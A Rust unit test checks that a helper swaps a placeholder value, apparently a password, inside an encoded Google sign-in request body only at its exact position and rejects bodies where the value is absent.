fn google_is_swapped_at_its_place_only() {
    let q = |s: &str| super::scope::quote_plus(s, "*");
    let envelope =
        r#"[[["B4hajb","[1,1,null,[1,null,null,null,[\"\u00355190342\",null,1]],\"\u55190342\"]",null,"generic"]]]"#;
    let body = format!("f.req={}&at=tok", q(envelope));
    let out = super::scope::swap_google_sign_in(&body, "55190342", "66001122").expect("swapped");
    let (freq, at) = out.split_once('&').expect("two fields");
    assert_eq!(at, "at=tok");
    let env: serde_json::Value =
        serde_json::from_str(&super::scope::unquote_plus(freq.strip_prefix("f.req=").expect("f.req"))).expect("json");
    let payload: serde_json::Value = serde_json::from_str(env[0][0][1].as_str().expect("payload")).expect("json");
    assert_eq!(payload[3][4][0], "66001122");
    assert_eq!(payload[4], "\u{5519}0342");
    // Not at its place: no password.
    assert!(super::scope::swap_google_sign_in(&body, "11111111", "x").is_err());
}
